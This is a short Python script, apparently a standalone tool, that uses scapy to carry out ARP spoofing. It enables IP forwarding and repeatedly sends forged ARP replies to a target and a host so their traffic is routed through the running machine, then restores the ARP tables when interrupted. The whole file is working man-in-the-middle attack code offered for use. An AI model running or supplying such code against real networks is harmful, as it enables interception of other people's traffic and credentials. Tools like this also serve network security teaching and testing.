from scapy.all import Ether, ARP, srp, send
import argparse
import time

def enable_ipforward():
       filepath="/proc/sys/net/ipv4/ip_forward"
       with open(filepath) as f:
            if f.read() == 1:
                  return
           
       with open(filepath, "w") as f:
           print(1, file=f)

def get_mac(ip):
    
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src


def spoof(target_ip, host_ip, verbose=True):
       target_mac=get_mac(target_ip)
       
       arg_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op="is-at")
       
       send(arg_response, verbose=0) 
       
       if verbose:
            self_mac=ARP().hwsrc
            print("sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
            
def restore(target_ip, host_ip, verbose=True):
        
        target_mac=get_mac(target_ip)
        
        host_mac=get_mac(host_ip)
        
        arg_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
        
        send(arg_response, verbose=0, count=7)
        
        if verbose:
                  print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
        
if __name__  == "__main__":

     parser = argparse.ArgumentParser(description="ARP spoofing")
     parser.add_argument("target", help="Set target ip address")
     parser.add_argument("host", help="set host ip address")
     parser.add_argument("-v", "--verbose", action="store_true", help="Print small data after a few seconds")

     args = parser.parse_args()
     target, host, verbose = args.target, args.host, args.verbose

     enable_ipforward()
     try:
         while True:
              
              spoof(target, host, verbose)
              spoof(host, target, verbose)
              
              time.sleep(1)
              
     except KeyboardInterrupt:
          print("[!] CTRL+C detected ! restoring the network, please wait...")
          restore(target, host)
          restore(host, target)
